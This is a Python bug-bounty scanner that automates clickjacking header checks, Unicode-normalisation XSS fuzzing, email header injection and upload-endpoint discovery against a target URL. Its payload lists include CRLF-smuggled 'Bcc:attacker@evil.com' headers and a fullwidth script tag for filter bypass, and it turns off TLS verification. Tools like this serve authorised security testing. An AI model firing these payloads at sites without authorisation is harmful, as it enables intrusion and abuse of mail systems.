#!/usr/bin/env python3
"""
REDHAVEN MODULE 39: HUNTER'S TOOLKIT
Purpose: Automation of manual bug hunter checklists (Unicode, Email, Clickjacking, Uploads)
Author: Franco Andino (darkne55)
"""

import argparse
import requests
import sys
import re
import urllib3
import logging
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from concurrent.futures import ThreadPoolExecutor

# Disable warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Config
logging.basicConfig(level=logging.INFO, format='[%(levelname)s] %(message)s')
logger = logging.getLogger("HunterToolkit")

# Payloads
UNICODE_PAYLOADS = [
    "¼", "½", "¾",  # Fraction normalization (potential SQLi/logic)
    "ﬁ", "ﬂ",       # Ligature normalization (WAF bypass)
    "chłodna",      # UTF-8 handling
    "ß",            # German Eszett (ss normalization)
    "ي",            # Arabic characters
    "＜script＞",    # Fullwidth characters (XSS WAF bypass)
    "％００",        # Fullwidth null byte
]

EMAIL_HEADER_PAYLOADS = [
    "%0aBcc:attacker@evil.com",
    "%0d%0aBcc:attacker@evil.com",
    "%0aX-Forwarded-For:127.0.0.1",
    "%0d%0aSubject:Hacked",
]

UPLOAD_PATHS = [
    "/upload", "/api/upload", "/fileupload", "/api/v1/upload",
    "/import", "/api/import", "/profile/upload", "/user/avatar"
]

class HunterToolkit:
    def __init__(self, target_url, threads=10):
        self.target = target_url
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) RedHaven/2.0'
        })
        self.threads = threads
        self.findings = []

    def check_clickjacking(self):
        """Image 2 Item 9: Check for IFRAME (Clickjacking)"""
        print(f"[*] Checking Clickjacking on {self.target}...")
        try:
            r = self.session.get(self.target, verify=False, timeout=10)
            headers = r.headers
            
            x_frame = headers.get('X-Frame-Options', '').lower()
            csp = headers.get('Content-Security-Policy', '').lower()
            
            vulnerable = True
            if x_frame in ['deny', 'sameorigin']:
                vulnerable = False
            if 'frame-ancestors' in csp:
                vulnerable = False
                
            if vulnerable:
                print(f"[+] VULN: Clickjacking possible on {self.target} (Missing X-Frame-Options/CSP)")
                self.findings.append({"type": "clickjacking", "url": self.target, "info": "Missing anti-framing headers"})
            else:
                print(f"[-] OK: Clickjacking protected via headers")
                
        except Exception as e:
            print(f"[!] Error checking clickjacking: {e}")

    def check_unicode_injection(self, url_with_params):
        """Image 2 Item 17: Check for Unicode Injection"""
        parsed = urlparse(url_with_params)
        params = parse_qs(parsed.query)
        
        if not params:
            return

        print(f"[*] Testing Unicode Injection on parameters: {', '.join(params.keys())}")
        
        # Base request to compare
        try:
            base_r = self.session.get(url_with_params, verify=False, timeout=5)
            base_len = len(base_r.text)
            base_code = base_r.status_code
        except:
            return

        for param, values in params.items():
            for payload in UNICODE_PAYLOADS:
                # Replace value with payload
                new_params = params.copy()
                new_params[param] = payload
                
                query_string = urlencode(new_params, doseq=True)
                new_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, query_string, parsed.fragment))
                
                try:
                    r = self.session.get(new_url, verify=False, timeout=5)
                    
                    # Heuristics: 500 Error or significant length change (normalization error)
                    if r.status_code == 500:
                        print(f"[+] VULN: Unicode 500 Error on {param} with payload {payload}")
                        self.findings.append({"type": "unicode_crash", "url": new_url, "param": param, "payload": payload})
                    
                    # Check for reflection of the unicode char OR normalized version
                    # e.g. send <script> (fullwidth) -> reflected as <script> (normal) = XSS Bypass
                    if payload in r.text:
                         print(f"[!] REFLECTION: Unicode payload reflected verbatim in {param}")
                    
                    # Check if '＜script＞' normalized to '<script>'
                    if payload == "＜script＞" and "<script>" in r.text:
                        print(f"[+] VULN: Unicode Normalization XSS detected on {param}!")
                        self.findings.append({"type": "unicode_xss", "url": new_url, "param": param})
                        
                except Exception as e:
                    pass

    def check_email_headers(self, url_with_params):
        """Image 2 Item 7: Email Header Injection"""
        parsed = urlparse(url_with_params)
        params = parse_qs(parsed.query)
        
        email_params = [p for p in params.keys() if any(x in p.lower() for x in ['email', 'mail', 'recip', 'to', 'contact', 'subject'])]
        
        if not email_params:
            return

        print(f"[*] Testing Email Header Injection on: {', '.join(email_params)}")
        
        for param in email_params:
            for payload in EMAIL_HEADER_PAYLOADS:
                new_params = params.copy()
                new_params[param] = payload  # Append payload? usually replace or append
                
                query_string = urlencode(new_params, doseq=True)
                new_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, query_string, parsed.fragment))
                
                try:
                    r = self.session.get(new_url, verify=False, timeout=5)
                    # Difficult to detect without callback, but we look for weird errors or reflections
                    if "syntax error" in r.text.lower() or "header" in r.text.lower():
                        print(f"[+] SUSPICIOUS: Potential Email Header Injection on {param}")
                        self.findings.append({"type": "email_injection_hint", "url": new_url, "param": param})
                except:
                    pass

    def check_file_uploads(self):
        """Image 2 Item 24: File Upload Discovery"""
        print("[*] Probing for File Upload endpoints...")
        
        base_url = f"{parsed_args.url.rstrip('/')}"
        
        for path in UPLOAD_PATHS:
            target = base_url + path
            try:
                r = self.session.get(target, verify=False, timeout=5)
                # Check for forms
                if 'type="file"' in r.text or 'multipart/form-data' in r.text:
                    print(f"[+] FOUND: Upload form at {target}")
                    self.findings.append({"type": "upload_form", "url": target})
                elif r.status_code in [200, 405] and "upload" in r.text.lower():
                    # 405 Method Not Allowed often means GET failed but POST might work
                    print(f"[+] INTERESTING: Potential upload endpoint at {target} (Status: {r.status_code})")
                    self.findings.append({"type": "potential_upload", "url": target})
            except:
                pass

    def run(self):
        print(f"=== HUNTER'S TOOLKIT v1.0 ===")
        print(f"Target: {self.target}")
        
        # 1. Clickjacking (Root URL)
        self.check_clickjacking()
        
        # 2. File Uploads (Root URL)
        self.check_file_uploads()
        
        # 3. Param-based attacks (Unicode + Email)
        # In a real scenario, we would spider or read from a file. 
        # For this module, assuming the input URL might have params, or we just test root?
        # Better: if user supplies a list of URLs with params.
        
        if parsed_args.list:
            print(f"[*] Processing URL list from {parsed_args.list}...")
            try:
                with open(parsed_args.list, 'r') as f:
                    urls = [line.strip() for line in f if line.strip()]
                    
                with ThreadPoolExecutor(max_workers=self.threads) as executor:
                    executor.map(self.check_unicode_injection, urls)
                    executor.map(self.check_email_headers, urls)
            except Exception as e:
                print(f"[!] Error reading list: {e}")
        elif "?" in self.target:
             self.check_unicode_injection(self.target)
             self.check_email_headers(self.target)
        else:
            print("[*] No parameters in target URL and no list provided. Skipping Param-based checks (Unicode/Email).")

        return self.findings

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Hunter's Toolkit - Manual Bug Bounty Checks Automator")
    parser.add_argument("-u", "--url", required=True, help="Base Target URL")
    parser.add_argument("-l", "--list", help="List of URLs with parameters to fuzz")
    parser.add_argument("-t", "--threads", type=int, default=10, help="Threads")
    
    parsed_args = parser.parse_args()
    
    toolkit = HunterToolkit(parsed_args.url, parsed_args.threads)
    results = toolkit.run()
    
    if results:
        print("\n=== SUMMARY OF FINDINGS ===")
        for f in results:
            print(f"- {f['type'].upper()}: {f.get('url')} ({f.get('info', '')})")
    else:
        print("\n=== NO OBVIOUS ISSUES FOUND ===")
